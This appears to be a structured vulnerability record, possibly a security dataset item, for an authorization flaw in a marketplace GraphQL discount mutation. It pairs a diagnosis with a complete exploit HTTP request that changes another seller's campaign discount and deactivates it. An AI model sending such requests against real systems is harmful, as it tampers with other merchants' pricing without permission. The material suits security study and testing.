diagnosis: The marketplace discount campaign GraphQL mutation modifies promotional pricing rules using a campaign ID argument without verifying that the authenticated seller owns the campaign. Competitor merchants can prematurely deactivate promotional discounts or manipulate discount percentages on competing stores.
exploit_request:
POST /graphql HTTP/1.1
Host: marketplace.vendorhub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzZWxsZXJfOTAxIn0.sig
Content-Type: application/json

{"query": "mutation { updateDiscountCampaign(campaignId: 4402, input: { discountPercentage: 80, active: false }) { id campaignName discountPercentage } }"}
